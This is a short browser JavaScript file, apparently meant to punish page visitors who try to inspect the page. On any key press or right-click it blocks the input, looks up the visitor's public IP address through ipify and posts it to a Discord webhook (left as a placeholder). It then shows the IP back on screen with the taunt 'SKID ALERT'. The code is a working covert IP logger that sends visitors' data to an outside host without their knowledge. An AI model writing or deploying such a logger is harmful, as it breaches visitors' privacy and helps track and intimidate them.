
const discordWebhookUrl = 'WEBHOOK_HERE';

async function fetchIPv4() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        const message = { content: 'New IP Address Detected: ' + ip };
        
        const discordResponse = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        if (!discordResponse.ok) {
            throw new Error('Failed to send IP to Discord: ' + discordResponse.status + ' - ' + discordResponse.statusText);
        }

        return ip;
    } catch (error) {
        console.error('Error fetching IP and sending to Discord:', error);
        return 'Unknown IPv4';
    }
}

async function flash() {
    const flashOverlay = document.getElementById('flashOverlay');
    const flashText = document.getElementById('flashText');
    
    flashOverlay.style.display = 'block';
    flashText.style.display = 'block';
    

    const ip = await fetchIPv4();
    flashText.innerHTML = 'Your IPv4: ' + ip + ' - SKID ALERT';
}


function handleEvent(event) {
    event.preventDefault();
    flash();
}


window.addEventListener('keydown', handleEvent);
window.addEventListener('contextmenu', handleEvent);
